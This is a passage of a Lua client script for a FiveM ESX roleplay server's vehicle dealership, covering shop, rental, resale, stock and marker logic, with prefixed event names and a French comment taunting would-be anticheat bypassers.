-------- ARRETE D'ESSAYEZ DE DUMP POUR BYPASS MON ANTICHEAT TU REUSSIRA PAS ^^ --------
_print = print
_TriggerServerEvent = TriggerServerEvent
_NetworkExplodeVehicle = NetworkExplodeVehicle
_AddExplosion = AddExplosion

local Keys = {
	["ESC"] = 322, ["F1"] = 288, ["F2"] = 289, ["F3"] = 170, ["F5"] = 166, ["F6"] = 167, ["F7"] = 168, ["F8"] = 169, ["F9"] = 56, ["F10"] = 57,
	["~"] = 243, ["1"] = 157, ["2"] = 158, ["3"] = 160, ["4"] = 164, ["5"] = 165, ["6"] = 159, ["7"] = 161, ["8"] = 162, ["9"] = 163, ["-"] = 84, ["="] = 83, ["BACKSPACE"] = 177,
	["TAB"] = 37, ["Q"] = 44, ["W"] = 32, ["E"] = 38, ["R"] = 45, ["T"] = 245, ["Y"] = 246, ["U"] = 303, ["P"] = 199, ["["] = 39, ["]"] = 40, ["ENTER"] = 18,
	["CAPS"] = 137, ["A"] = 34, ["S"] = 8, ["D"] = 9, ["F"] = 23, ["G"] = 47, ["H"] = 74, ["K"] = 311, ["L"] = 182,
	["LEFTSHIFT"] = 21, ["Z"] = 20, ["X"] = 73, ["C"] = 26, ["V"] = 0, ["B"] = 29, ["N"] = 249, ["M"] = 244, [","] = 82, ["."] = 81,
	["LEFTCTRL"] = 36, ["LEFTALT"] = 19, ["SPACE"] = 22, ["RIGHTCTRL"] = 70,
	["HOME"] = 213, ["PAGEUP"] = 10, ["PAGEDOWN"] = 11, ["DELETE"] = 178,
	["LEFT"] = 174, ["RIGHT"] = 175, ["TOP"] = 27, ["DOWN"] = 173,
	["NENTER"] = 201, ["N4"] = 108, ["N5"] = 60, ["N6"] = 107, ["N+"] = 96, ["N-"] = 97, ["N7"] = 117, ["N8"] = 61, ["N9"] = 118
}

local HasAlreadyEnteredMarker = false
local LastZone = {}

local CurrentAction = nil
local CurrentActionMsg = ''
local CurrentActionData = {}

local IsInShopMenu = false

local Categories = {}
local Vehicles = {}
local LastVehicles = {}
local CurrentVehicleData = nil

Citizen.CreateThread(function()
	while ESX == nil do
		TriggerEvent('::{korioz#0110}::esx:getSharedObject', function(obj) ESX = obj end)
		Citizen.Wait(0)
	end

	while ESX.GetPlayerData().job == nil do
		Citizen.Wait(10)
	end

	PlayerData = ESX.GetPlayerData()

	ESX.TriggerServerCallback('::{korioz#0110}::esx_vehicleshop:getCategories', function(categories)
		Categories = categories
	end)

	ESX.TriggerServerCallback('::{korioz#0110}::esx_vehicleshop:getVehicles', function(vehicles)
		Vehicles = vehicles
	end)

	if Config.EnablePlayerManagement then
		for k, v in pairs(Config.Society) do
			if ESX.PlayerData.job.name == k then
				Config.Zones[k].ShopEntering.Type = 1

				if ESX.PlayerData.job.grade_name == 'boss' then
					Config.Zones[k].BossActions.Type = 1
				end
			else
				Config.Zones[k].ShopEntering.Type = -1
				Config.Zones[k].BossActions.Type = -1
			end
		end
	end
end)

RegisterNetEvent('::{korioz#0110}::esx:playerLoaded')
AddEventHandler('::{korioz#0110}::esx:playerLoaded', function(xPlayer)
	ESX.PlayerData = xPlayer

	if Config.EnablePlayerManagement then
		for k, v in pairs(Config.Society) do
			if ESX.PlayerData.job.name == k then
				Config.Zones[k].ShopEntering.Type = 1

				if ESX.PlayerData.job.grade_name == 'boss' then
					Config.Zones[k].BossActions.Type = 1
				end
			else
				Config.Zones[k].ShopEntering.Type = -1
				Config.Zones[k].BossActions.Type = -1
			end
		end
	end
end)

RegisterNetEvent('::{korioz#0110}::esx_vehicleshop:sendCategories')
AddEventHandler('::{korioz#0110}::esx_vehicleshop:sendCategories', function(categories)
	Categories = categories
end)

RegisterNetEvent('::{korioz#0110}::esx_vehicleshop:sendVehicles')
AddEventHandler('::{korioz#0110}::esx_vehicleshop:sendVehicles', function(vehicles)
	Vehicles = vehicles
end)

function DeleteShopInsideVehicles()
	while #LastVehicles > 0 do
		local vehicle = LastVehicles[1]
		ESX.Game.DeleteVehicle(vehicle)
		table.remove(LastVehicles, 1)
	end
end

function ReturnVehicleProvider()
	ESX.TriggerServerCallback('::{korioz#0110}::esx_vehicleshop:getCommercialVehicles', function(vehicles)
		local elements = {}

		for i = 1, #vehicles, 1 do
			table.insert(elements, {
				label = vehicles[i].name,
				rightlabel = {'$' .. ESX.Math.GroupDigits(ESX.Math.Round(vehicles[i].price * 0.75))},
				value = vehicles[i].name
			})
		end
	
		ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'return_provider_menu', {
			title = _U('return_provider_menu'),
			elements = elements
		}, function(data, menu)
			_TriggerServerEvent('::{korioz#0110}::esx_vehicleshop:returnProvider', data.current.value)
			Citizen.Wait(300)
			menu.close()

			ReturnVehicleProvider()
		end, function(data, menu)
		end)
	end, LastZone[1])
end

function StartShopRestriction()
	Citizen.CreateThread(function()
		while IsInShopMenu do
			Citizen.Wait(1)
	
			DisableControlAction(0, 75,  true) -- Disable exit vehicle
			DisableControlAction(27, 75, true) -- Disable exit vehicle
		end
	end)
end

function OpenShopMenu()
	IsInShopMenu = true
	StartShopRestriction()

	local playerPed = PlayerPedId()

	FreezeEntityPosition(playerPed, true)
	SetEntityVisible(playerPed, false)
	SetEntityCoords(playerPed, Config.Zones[LastZone[1]].ShopInside.Pos)

	local vehiclesByCategory = {}
	local elements = {}
	local firstVehicleData = nil

	for k, v in ipairs(Categories) do
		vehiclesByCategory[v.name] = {}
	end

	for k, v in ipairs(Vehicles) do
		if IsModelInCdimage(GetHashKey(v.model)) then
			table.insert(vehiclesByCategory[v.category], v)
		end
	end

	for k, v in ipairs(Categories) do
		if v.society == LastZone[1] then
			local options = {name = {}, description = {}}

			for k2, v2 in ipairs(vehiclesByCategory[v.name]) do
				if firstVehicleData == nil then
					firstVehicleData = v2
				end

				table.insert(options.name, v2.name)
				table.insert(options.description, 'Prix d\'achat : $~g~' .. ESX.Math.GroupDigits(v2.price))
			end

			table.insert(elements, {
				name = v.name,
				label = v.label,
				value = 1,
				type = 'list',
				options = options
			})
		end
	end

	ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'vehicle_shop', {
		title = _U('car_dealer'),
		elements = elements
	}, function(data, menu)
		local vehicleData = vehiclesByCategory[data.current.name][data.current.value]

		ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'shop_confirm', {
			title = _U('buy_vehicle_shop', vehicleData.name, ESX.Math.GroupDigits(vehicleData.price)),
			elements = {
				{label = _U('no'), value = 'no'},
				{label = _U('yes'), value = 'yes'}
			}
		}, function(data2, menu2)
			if data2.current.value == 'yes' then
				if Config.EnablePlayerManagement then
					ESX.TriggerServerCallback('::{korioz#0110}::esx_vehicleshop:buyVehicleSociety', function(hasEnoughMoney)
						if hasEnoughMoney then
							IsInShopMenu = false
							DeleteShopInsideVehicles()
							local playerPed = PlayerPedId()

							CurrentAction = 'shop_menu'
							CurrentActionMsg = _U('shop_menu')
							CurrentActionData = {}

							FreezeEntityPosition(playerPed, false)
							SetEntityVisible(playerPed, true)
							SetEntityCoords(playerPed, Config.Zones[LastZone[1]].ShopEntering.Pos)

							menu2.close()
							menu.close()

							ESX.ShowNotification(_U('vehicle_purchased'))
						else
							ESX.ShowNotification(_U('broke_company'))
						end
					end, LastZone[1], vehicleData.model)
				else
					local playerData = ESX.GetPlayerData()

					if Config.EnableSocietyOwnedVehicles and playerData.job.grade_name == 'boss' then
						ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'shop_confirm_buy_type', {
							title = _U('purchase_type'),
							elements = {
								{label = _U('staff_type'), value = 'personnal'},
								{label = _U('society_type'), value = 'society'}
							}
						}, function(data3, menu3)
							if data3.current.value == 'personnal' then
								ESX.TriggerServerCallback('::{korioz#0110}::esx_vehicleshop:buyVehicle', function(hasEnoughMoney)
									if hasEnoughMoney then
										IsInShopMenu = false

										menu3.close()
										menu2.close()
										menu.close()

										DeleteShopInsideVehicles()

										ESX.Game.SpawnVehicle(vehicleData.model, Config.Zones[LastZone[1]].ShopOutside.Pos, Config.Zones[LastZone[1]].ShopOutside.Heading, function(vehicle)
											TaskWarpPedIntoVehicle(playerPed, vehicle, -1)

											local newPlate = GeneratePlate()
											local vehicleProps = ESX.Game.GetVehicleProperties(vehicle)
											vehicleProps.plate = newPlate
											SetVehicleNumberPlateText(vehicle, newPlate)

											if Config.EnableOwnedVehicles then
												_TriggerServerEvent('::{korioz#0110}::esx_vehicleshop:setVehicleOwned', vehicleProps, getVehicleType(vehicleProps.model))
											end

											ESX.ShowNotification(_U('vehicle_purchased'))
										end)

										FreezeEntityPosition(playerPed, false)
										SetEntityVisible(playerPed, true)
									else
										ESX.ShowNotification(_U('not_enough_money'))
									end
								end, vehicleData.model)
							elseif data3.current.value == 'society' then
								ESX.TriggerServerCallback('::{korioz#0110}::esx_vehicleshop:buyVehicleSociety', function(hasEnoughMoney)
									if hasEnoughMoney then
										IsInShopMenu = false

										menu3.close()
										menu2.close()
										menu.close()

										DeleteShopInsideVehicles()

										ESX.Game.SpawnVehicle(vehicleData.model, Config.Zones[LastZone[1]].ShopOutside.Pos, Config.Zones[LastZone[1]].ShopOutside.Heading, function(vehicle)
											TaskWarpPedIntoVehicle(playerPed, vehicle, -1)

											local newPlate = GeneratePlate()
											local vehicleProps = ESX.Game.GetVehicleProperties(vehicle)
											vehicleProps.plate = newPlate
											SetVehicleNumberPlateText(vehicle, newPlate)

											_TriggerServerEvent('::{korioz#0110}::esx_vehicleshop:setVehicleOwnedSociety', playerData.job.name, vehicleProps, getVehicleType(vehicleProps.model))

											ESX.ShowNotification(_U('vehicle_purchased'))
										end)

										FreezeEntityPosition(playerPed, false)
										SetEntityVisible(playerPed, true)
									else
										ESX.ShowNotification(_U('broke_company'))
									end
								end, playerData.job.name, vehicleData.model)
							end
						end, function(data3, menu3)
						end)
					else
						ESX.TriggerServerCallback('::{korioz#0110}::esx_vehicleshop:buyVehicle', function(hasEnoughMoney)
							if hasEnoughMoney then
								IsInShopMenu = false

								menu2.close()
								menu.close()

								DeleteShopInsideVehicles()

								ESX.Game.SpawnVehicle(vehicleData.model, Config.Zones[LastZone[1]].ShopOutside.Pos, Config.Zones[LastZone[1]].ShopOutside.Heading, function(vehicle)
									TaskWarpPedIntoVehicle(playerPed, vehicle, -1)

									local newPlate = GeneratePlate()
									local vehicleProps = ESX.Game.GetVehicleProperties(vehicle)
									vehicleProps.plate = newPlate
									SetVehicleNumberPlateText(vehicle, newPlate)

									if Config.EnableOwnedVehicles then
										_TriggerServerEvent('::{korioz#0110}::esx_vehicleshop:setVehicleOwned', vehicleProps, getVehicleType(vehicleProps.model))
									end

									ESX.ShowNotification(_U('vehicle_purchased'))
								end)

								FreezeEntityPosition(playerPed, false)
								SetEntityVisible(playerPed, true)
							else
								ESX.ShowNotification(_U('not_enough_money'))
							end
						end, vehicleData.model)
					end
				end
			end
		end, function(data2, menu2)
		end)
	end, function(data, menu)
		DeleteShopInsideVehicles()
		local playerPed = PlayerPedId()

		CurrentAction = 'shop_menu'
		CurrentActionMsg = _U('shop_menu')
		CurrentActionData = {}

		FreezeEntityPosition(playerPed, false)
		SetEntityVisible(playerPed, true)
		SetEntityCoords(playerPed, Config.Zones[LastZone[1]].ShopEntering.Pos)

		IsInShopMenu = false
	end, function(data, menu)
		local vehicleData = vehiclesByCategory[data.current.name][data.current.value]
		local playerPed = PlayerPedId()

		DeleteShopInsideVehicles()
		WaitForVehicleToLoad(vehicleData.model)

		ESX.Game.SpawnLocalVehicle(vehicleData.model, Config.Zones[LastZone[1]].ShopInside.Pos, Config.Zones[LastZone[1]].ShopInside.Heading, function(vehicle)
			table.insert(LastVehicles, vehicle)
			TaskWarpPedIntoVehicle(playerPed, vehicle, -1)
			FreezeEntityPosition(vehicle, true)
		end)
	end)

	DeleteShopInsideVehicles()
	WaitForVehicleToLoad(firstVehicleData.model)

	ESX.Game.SpawnLocalVehicle(firstVehicleData.model, Config.Zones[LastZone[1]].ShopInside.Pos, Config.Zones[LastZone[1]].ShopInside.Heading, function(vehicle)
		table.insert(LastVehicles, vehicle)
		TaskWarpPedIntoVehicle(playerPed, vehicle, -1)
		FreezeEntityPosition(vehicle, true)
	end)
end

function WaitForVehicleToLoad(modelHash)
	modelHash = (type(modelHash) == 'number' and modelHash or GetHashKey(modelHash))

	if not HasModelLoaded(modelHash) then
		RequestModel(modelHash)

		while not HasModelLoaded(modelHash) do
			Citizen.Wait(1)

			DisableControlAction(0, Keys['TOP'], true)
			DisableControlAction(0, Keys['DOWN'], true)
			DisableControlAction(0, Keys['LEFT'], true)
			DisableControlAction(0, Keys['RIGHT'], true)
			DisableControlAction(0, 176, true) -- ENTER key
			DisableControlAction(0, Keys['BACKSPACE'], true)

			drawLoadingText(_U('shop_awaiting_model'), 255, 255, 255, 255)
		end
	end
end

function OpenResellerMenu()
	ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'reseller', {
		title = _U('car_dealer'),
		elements = {
			{label = _U('buy_vehicle'), value = 'buy_vehicle'},
			{label = _U('pop_vehicle'), value = 'pop_vehicle'},
			{label = _U('depop_vehicle'), value = 'depop_vehicle'},
			{label = _U('return_provider'), value = 'return_provider'},
			{label = _U('create_bill'), value = 'create_bill'},
			{label = _U('get_rented_vehicles'), value = 'get_rented_vehicles'},
			{label = _U('set_vehicle_owner_sell'), value = 'set_vehicle_owner_sell'},
			{label = _U('set_vehicle_owner_rent'), value = 'set_vehicle_owner_rent'},
			{label = _U('set_vehicle_owner_sell_society'), value = 'set_vehicle_owner_sell_society'},
			{label = _U('deposit_stock'), value = 'put_stock'},
			{label = _U('take_stock'), value = 'get_stock'}
		}
	}, function(data, menu)
		local action = data.current.value

		if action == 'buy_vehicle' then
			OpenShopMenu()
		elseif action == 'put_stock' then
			OpenPutStocksMenu()
		elseif action == 'get_stock' then
			OpenGetStocksMenu()
		elseif action == 'pop_vehicle' then
			OpenPopVehicleMenu()
		elseif action == 'depop_vehicle' then
			DeleteShopInsideVehicles()
		elseif action == 'return_provider' then
			ReturnVehicleProvider()
		elseif action == 'create_bill' then
			local closestPlayer, closestDistance = ESX.Game.GetClosestPlayer()
			if closestPlayer == -1 or closestDistance > 3.0 then
				ESX.ShowNotification(_U('no_players'))
				return
			end

			ESX.UI.Menu.Open('dialog', GetCurrentResourceName(), 'set_vehicle_owner_sell_amount', {
				title = _U('invoice_amount')
			}, function(data2, menu2)
				local amount = tonumber(data2.value)

				if amount == nil then
					ESX.ShowNotification(_U('invalid_amount'))
				else
					menu2.close()
					local closestPlayer, closestDistance = ESX.Game.GetClosestPlayer()

					if closestPlayer == -1 or closestDistance > 3.0 then
						ESX.ShowNotification(_U('no_players'))
					else
						_TriggerServerEvent('::{korioz#0110}::esx_billing:sendBill', GetPlayerServerId(closestPlayer), 'society_' .. ESX.PlayerData.job.name, _U('car_dealer'), tonumber(data2.value))
					end
				end
			end, function(data2, menu2)
				menu2.close()
			end)
		elseif action == 'get_rented_vehicles' then
			OpenRentedVehiclesMenu()
		elseif action == 'set_vehicle_owner_sell' then
			local closestPlayer, closestDistance = ESX.Game.GetClosestPlayer()

			if closestPlayer == -1 or closestDistance > 3.0 then
				ESX.ShowNotification(_U('no_players'))
			else
				local newPlate = GeneratePlate()
				local vehicleProps = ESX.Game.GetVehicleProperties(LastVehicles[#LastVehicles])
				local model = CurrentVehicleData.model
				vehicleProps.plate = newPlate
				SetVehicleNumberPlateText(LastVehicles[#LastVehicles], newPlate)

				_TriggerServerEvent('::{korioz#0110}::esx_vehicleshop:sellVehicle', model)
				_TriggerServerEvent('::{korioz#0110}::esx_vehicleshop:addToList', GetPlayerServerId(closestPlayer), model, newPlate, LastZone[1])

				if Config.EnableOwnedVehicles then
					_TriggerServerEvent('::{korioz#0110}::esx_vehicleshop:setVehicleOwnedPlayerId', GetPlayerServerId(closestPlayer), vehicleProps, getVehicleType(vehicleProps.model))
					ESX.ShowNotification(_U('vehicle_set_owned', vehicleProps.plate, GetPlayerName(closestPlayer)))
				else
					ESX.ShowNotification(_U('vehicle_sold_to', vehicleProps.plate, GetPlayerName(closestPlayer)))
				end
			end
		elseif action == 'set_vehicle_owner_sell_society' then
			local closestPlayer, closestDistance = ESX.Game.GetClosestPlayer()

			if closestPlayer == -1 or closestDistance > 3.0 then
				ESX.ShowNotification(_U('no_players'))
			else
				menu.close()

				ESX.TriggerServerCallback('::{korioz#0110}::esx:getOtherPlayerData', function(xPlayer)
					local newPlate = GeneratePlate()
					local vehicleProps = ESX.Game.GetVehicleProperties(LastVehicles[#LastVehicles])
					local model = CurrentVehicleData.model
					vehicleProps.plate = newPlate
					SetVehicleNumberPlateText(LastVehicles[#LastVehicles], newPlate)

					_TriggerServerEvent('::{korioz#0110}::esx_vehicleshop:sellVehicle', model)
					_TriggerServerEvent('::{korioz#0110}::esx_vehicleshop:addToList', GetPlayerServerId(closestPlayer), model, newPlate, LastZone[1])

					if Config.EnableSocietyOwnedVehicles then
						_TriggerServerEvent('::{korioz#0110}::esx_vehicleshop:setVehicleOwnedSociety', xPlayer.job.name, vehicleProps, getVehicleType(vehicleProps.model))
						ESX.ShowNotification(_U('vehicle_set_owned', vehicleProps.plate, GetPlayerName(closestPlayer)))
					else
						ESX.ShowNotification(_U('vehicle_sold_to', vehicleProps.plate, GetPlayerName(closestPlayer)))
					end
				end, GetPlayerServerId(closestPlayer))
			end
		elseif action == 'set_vehicle_owner_rent' then
			ESX.UI.Menu.Open('dialog', GetCurrentResourceName(), 'set_vehicle_owner_rent_amount', {
				title = _U('rental_amount')
			}, function(data2, menu2)
				local amount = tonumber(data2.value)

				if amount == nil then
					ESX.ShowNotification(_U('invalid_amount'))
				else
					menu2.close()

					local closestPlayer, closestDistance = ESX.Game.GetClosestPlayer()

					if closestPlayer == -1 or closestDistance > 5.0 then
						ESX.ShowNotification(_U('no_players'))
					else
						local newPlate = 'RENT' .. string.upper(ESX.GetRandomString(4))
						local vehicleProps = ESX.Game.GetVehicleProperties(LastVehicles[#LastVehicles])
						local model = CurrentVehicleData.model
						vehicleProps.plate = newPlate
						SetVehicleNumberPlateText(LastVehicles[#LastVehicles], newPlate)
						_TriggerServerEvent('::{korioz#0110}::esx_vehicleshop:rentVehicle', model, vehicleProps.plate, GetPlayerName(closestPlayer), CurrentVehicleData.price, amount, GetPlayerServerId(closestPlayer), LastZone[1])

						if Config.EnableOwnedVehicles then
							_TriggerServerEvent('::{korioz#0110}::esx_vehicleshop:setVehicleOwnedPlayerId', GetPlayerServerId(closestPlayer), vehicleProps, getVehicleType(vehicleProps.model))
						end

						ESX.ShowNotification(_U('vehicle_set_rented', vehicleProps.plate, GetPlayerName(closestPlayer)))
						_TriggerServerEvent('::{korioz#0110}::esx_vehicleshop:setVehicleForAllPlayers', vehicleProps, Config.Zones[LastZone[1]].ShopInside.Pos, 5.0)
					end
				end
			end, function(data2, menu2)
				menu2.close()
			end)
		end
	end, function(data, menu)
		CurrentAction = 'reseller_menu'
		CurrentActionMsg = _U('shop_menu')
		CurrentActionData = {}
	end)
end

function OpenPopVehicleMenu()
	ESX.TriggerServerCallback('::{korioz#0110}::esx_vehicleshop:getCommercialVehicles', function(vehicles)
		local elements = {}

		for i = 1, #vehicles, 1 do
			table.insert(elements, {
				label = vehicles[i].name,
				rightlabel = {'$' .. ESX.Math.GroupDigits(vehicles[i].price)},
				value = vehicles[i].name
			})
		end

		ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'commercial_vehicles', {
			title = _U('vehicle_dealer'),
			elements = elements
		}, function(data, menu)
			local model = data.current.value
			DeleteShopInsideVehicles()

			ESX.Game.SpawnVehicle(model, Config.Zones[LastZone[1]].ShopOutside.Pos, Config.Zones[LastZone[1]].ShopOutside.Heading, function(vehicle)
				table.insert(LastVehicles, vehicle)

				for i = 1, #Vehicles, 1 do
					if model == Vehicles[i].model then
						CurrentVehicleData = Vehicles[i]
						break
					end
				end
			end)
		end, function(data, menu)
		end)
	end, LastZone[1])
end

function OpenRentedVehiclesMenu()
	ESX.TriggerServerCallback('::{korioz#0110}::esx_vehicleshop:getRentedVehicles', function(vehicles)
		local elements = {}

		for i = 1, #vehicles, 1 do
			table.insert(elements, {
				label = ('%s: %s'):format(vehicles[i].playerName, vehicles[i].name),
				rightlabel = {'[' .. ESX.Math.GroupDigits(vehicles[i].plate) .. ']'},
				value = vehicles[i].name
			})
		end

		ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'rented_vehicles', {
			title = _U('rent_vehicle'),
			elements = elements
		}, nil, function(data, menu)
		end)
	end, LastZone[1])
end

function OpenBossActionsMenu()
	ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'reseller', {
		title = _U('dealer_boss'),
		elements = {
			{label = _U('boss_actions'), value = 'boss_actions'},
			{label = _U('boss_sold'), value = 'sold_vehicles'}
		}
	}, function(data, menu)
		if data.current.value == 'boss_actions' then
			TriggerEvent('::{korioz#0110}::esx_society:openBossMenu', LastZone[1], function(data, menu) end)
		elseif data.current.value == 'sold_vehicles' then
			ESX.TriggerServerCallback('::{korioz#0110}::esx_vehicleshop:getSoldVehicles', function(customers)
				local elements = {
					head = { _U('customer_client'), _U('customer_model'), _U('customer_plate'), _U('customer_soldby'), _U('customer_date') },
					rows = {}
				}
		
				for i = 1, #customers, 1 do
					table.insert(elements.rows, {
						data = customers[i],
						cols = {
							customers[i].client,
							customers[i].model,
							customers[i].plate,
							customers[i].soldby,
							customers[i].date
						}
					})
				end

				ESX.UI.Menu.Open('list', GetCurrentResourceName(), 'sold_vehicles', elements, function(data2, menu2)
				end, function(data2, menu2)
					menu2.close()
				end)
			end, LastZone[1])
		end
	end, function(data, menu)
		CurrentAction = 'boss_actions_menu'
		CurrentActionMsg = _U('shop_menu')
		CurrentActionData = {}
	end)
end

function OpenGetStocksMenu()
	ESX.TriggerServerCallback('::{korioz#0110}::esx_vehicleshop:getStockItems', function(items)
		local elements = {}

		for i = 1, #items, 1 do
			table.insert(elements, {
				label = items[i].label,
				rightlabel = {'(' .. items[i].count .. ')'},
				value = items[i].name
			})
		end

		ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'stocks_menu', {
			title = _U('dealership_stock'),
			elements = elements
		}, function(data, menu)
			local itemName = data.current.value

			ESX.UI.Menu.Open('dialog', GetCurrentResourceName(), 'stocks_menu_get_item_count', {
				title = _U('amount')
			}, function(data2, menu2)
				local count = tonumber(data2.value)

				if count == nil then
					ESX.ShowNotification(_U('quantity_invalid'))
				else
					_TriggerServerEvent('::{korioz#0110}::esx_vehicleshop:getStockItem', LastZone[1], itemName, count)
					menu2.close()
					menu.close()
					OpenGetStocksMenu()
				end
			end, function(data2, menu2)
				menu2.close()
			end)
		end, function(data, menu)
		end)
	end, LastZone[1])
end

function OpenPutStocksMenu()
	ESX.TriggerServerCallback('::{korioz#0110}::esx_vehicleshop:getPlayerInventory', function(inventory)
		local elements = {}

		for i = 1, #inventory.items, 1 do
			local item = inventory.items[i]

			if item.count > 0 then
				table.insert(elements, {
					label = item.label,
					rightlabel = {'(' .. item.count .. ')'},
					type = 'item_standard',
					value = item.name
				})
			end
		end

		ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'stocks_menu', {
			title = _U('inventory'),
			elements = elements
		}, function(data, menu)
			local itemName = data.current.value

			ESX.UI.Menu.Open('dialog', GetCurrentResourceName(), 'stocks_menu_put_item_count', {
				title = _U('amount')
			}, function(data2, menu2)
				local count = tonumber(data2.value)

				if count == nil then
					ESX.ShowNotification(_U('quantity_invalid'))
				else
					_TriggerServerEvent('::{korioz#0110}::esx_vehicleshop:putStockItems', LastZone[1], itemName, count)
					menu2.close()
					menu.close()
					OpenPutStocksMenu()
				end
			end, function(data2, menu2)
				menu2.close()
			end)
		end, function(data, menu)
		end)
	end)
end

RegisterNetEvent('::{korioz#0110}::esx:setJob')
AddEventHandler('::{korioz#0110}::esx:setJob', function (job)
	ESX.PlayerData.job = job

	if Config.EnablePlayerManagement then
		for k, v in pairs(Config.Society) do
			if ESX.PlayerData.job.name == k then
				Config.Zones[k].ShopEntering.Type = 1

				if ESX.PlayerData.job.grade_name == 'boss' then
					Config.Zones[k].BossActions.Type = 1
				end
			else
				Config.Zones[k].ShopEntering.Type = -1
				Config.Zones[k].BossActions.Type = -1
			end
		end
	end
end)

AddEventHandler('::{korioz#0110}::esx_vehicleshop:hasEnteredMarker', function(zone)
	if zone[2] == 'ShopEntering' then
		if Config.EnablePlayerManagement then
			if ESX.PlayerData.job ~= nil and ESX.PlayerData.job.name == zone[1] then
				CurrentAction = 'reseller_menu'
				CurrentActionMsg = _U('shop_menu')
				CurrentActionData = {}
			end
		else
			CurrentAction = 'shop_menu'
			CurrentActionMsg = _U('shop_menu')
			CurrentActionData = {}
		end
	elseif zone[2] == 'GiveBackVehicle' and Config.EnablePlayerManagement then
		local playerPed = PlayerPedId()

		if IsPedInAnyVehicle(playerPed, false) then
			local vehicle = GetVehiclePedIsIn(playerPed, false)

			CurrentAction = 'give_back_vehicle'
			CurrentActionMsg = _U('vehicle_menu')

			CurrentActionData = {
				vehicle = vehicle
			}
		end
	elseif zone[2] == 'ResellVehicle' then
		local playerPed = PlayerPedId()

		if IsPedSittingInAnyVehicle(playerPed) then
			local vehicle = GetVehiclePedIsIn(playerPed, false)
			local vehicleData, model, resellPrice, plate

			if GetPedInVehicleSeat(vehicle, -1) == playerPed then
				for i = 1, #Vehicles, 1 do
					if GetHashKey(Vehicles[i].model) == GetEntityModel(vehicle) then
						vehicleData = Vehicles[i]
						break
					end
				end
	
				resellPrice = ESX.Math.Round(vehicleData.price / 100 * Config.ResellPercentage)
				model = GetEntityModel(vehicle)
				plate = ESX.Math.Trim(GetVehicleNumberPlateText(vehicle))
	
				CurrentAction = 'resell_vehicle'
				CurrentActionMsg = _U('sell_menu', vehicleData.name, ESX.Math.GroupDigits(resellPrice))
	
				CurrentActionData = {
					vehicle = vehicle,
					label = vehicleData.name,
					price = resellPrice,
					model = model,
					plate = plate
				}
			end
		end
	elseif zone[2] == 'BossActions' and Config.EnablePlayerManagement and ESX.PlayerData.job ~= nil and ESX.PlayerData.job.name == zone[1] and ESX.PlayerData.job.grade_name == 'boss' then
		CurrentAction = 'boss_actions_menu'
		CurrentActionMsg = _U('shop_menu')
		CurrentActionData = {}
	end
end)

AddEventHandler('::{korioz#0110}::esx_vehicleshop:hasExitedMarker', function(zone)
	if not IsInShopMenu then
		ESX.UI.Menu.CloseAll()
	end

	CurrentAction = nil
end)

AddEventHandler('onResourceStop', function(resource)
	if resource == GetCurrentResourceName() then
		if IsInShopMenu then
			ESX.UI.Menu.CloseAll()

			DeleteShopInsideVehicles()

			local playerPed = PlayerPedId()

			FreezeEntityPosition(playerPed, false)
			SetEntityVisible(playerPed, true)
			SetEntityCoords(playerPed, Config.Zones.ShopEntering.Pos)
		end
	end
end)

-- Create Blips
Citizen.CreateThread(function()
	for k, v in pairs(Config.Blips) do
		local blip = AddBlipForCoord(v.Pos)

		SetBlipSprite(blip, v.Sprite)
		SetBlipDisplay(blip, 4)
		SetBlipScale(blip, 0.8)
		SetBlipAsShortRange(blip, true)

		BeginTextCommandSetBlipName("STRING")
		AddTextComponentSubstringPlayerName(v.Name)
		EndTextCommandSetBlipName(blip)
	end
end)

-- Display markers
Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)
		local coords = GetEntityCoords(PlayerPedId(), false)

		for k, v in pairs(Config.Zones) do
			for k2, v2 in pairs(v) do
				if v2.Type ~= -1 and GetDistanceBetweenCoords(coords, v2.Pos, true) < Config.DrawDistance then
					if v2.bossOnly and ESX.PlayerData.job ~= nil and ESX.PlayerData.job.grade_name == 'boss' then
						DrawMarker(v2.Type, v2.Pos, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, v2.Size, Config.MarkerColor.r, Config.MarkerColor.g, Config.MarkerColor.b, 100, false, true, 2, false, false, false, false)
					elseif not v2.bossOnly then
						DrawMarker(v2.Type, v2.Pos, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, v2.Size, Config.MarkerColor.r, Config.MarkerColor.g, Config.MarkerColor.b, 100, false, true, 2, false, false, false, false)
					end
				end
			end
		end
	end
end)

-- Enter / Exit marker events
Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)
		local coords = GetEntityCoords(PlayerPedId(), false)
		local isInMarker = false
		local currentZone = {}

		for k, v in pairs(Config.Zones) do
			for k2, v2 in pairs(v) do
				if GetDistanceBetweenCoords(coords, v2.Pos, true) < v2.Size.x then
					isInMarker = true
					currentZone = {k, k2}
				end
			end
		end

		if (isInMarker and not HasAlreadyEnteredMarker) or (isInMarker and (LastZone[1] ~= currentZone[1] or LastZone[2] ~= currentZone[2])) then
			HasAlreadyEnteredMarker = true
			LastZone = currentZone
			TriggerEvent('::{korioz#0110}::esx_vehicleshop:hasEnteredMarker', currentZone)
		end

		if not isInMarker and HasAlreadyEnteredMarker then
			HasAlreadyEnteredMarker = false
			TriggerEvent('::{korioz#0110}::esx_vehicleshop:hasExitedMarker', LastZone)
		end
	end
end)

-- Key controls
Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)

		if CurrentAction == nil then
			Citizen.Wait(50)
		else
			if CurrentAction == 'resell_vehicle' and ESX.PlayerData.job ~= nil and ESX.PlayerData.job.grade_name == 'boss' then
				ESX.ShowHelpNotification(CurrentActionMsg)
			elseif CurrentAction ~= 'resell_vehicle' then
				ESX.ShowHelpNotification(CurrentActionMsg)
			end

			if IsControlJustReleased(0, 38) then
				if CurrentAction == 'shop_menu' then
					if Config.LicenseEnable then
						ESX.TriggerServerCallback('::{korioz#0110}::esx_license:checkLicense', function(hasDriversLicense)
							if hasDriversLicense then
								OpenShopMenu()
							else
								ESX.ShowNotification(_U('license_missing'))
							end
